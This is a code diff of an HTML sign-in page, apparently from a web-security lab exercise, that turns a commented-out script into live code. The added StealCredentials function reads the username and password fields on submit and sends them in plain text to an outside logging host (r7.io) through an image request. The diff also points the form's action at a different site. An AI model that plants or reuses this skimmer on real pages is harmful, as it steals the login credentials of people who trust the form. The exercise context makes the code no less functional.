@@ -28,35 +28,27 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched">
+  <form id="login" action="https://nickhytrek.github.io" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
 
-      <!--<script type="text/javascript"> 
-      console.log("script");
+      <script type="text/javascript"> 
         function StealCredentials() {
-          console.log("function");
             var username = document.getElementById("login_username").value;
             var pass = document.getElementById("login_password").value;
-            var credentials = "username = " + username + " | " + "password = " + pass;
+          var credentials = "username = " + username + " | " + "password = " + pass;
             img = document.createElement("img");
-            img.src = "https://r7.io/e/nhytrek?s=" + credentials;
+            img.src = "http://r7.io/e/nhytrek?s=" + credentials;
         }
-        console.log("did it run");
-        document.forms[0].onsubmit = StealCredentials();
-        console.log("yes");
-      </script>-->
+        
+        document.forms[0].onsubmit = StealCredentials;
+        </script>
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
           <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
           <div class="error-msg">Hint: your username is separate from your email address.</div>
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true">
-          <script> 
-            var a = document.getElementById("login_username");
-            var b = document.getElementById("login_password");
-            console.log(a + b);
-          </script>
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
         <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
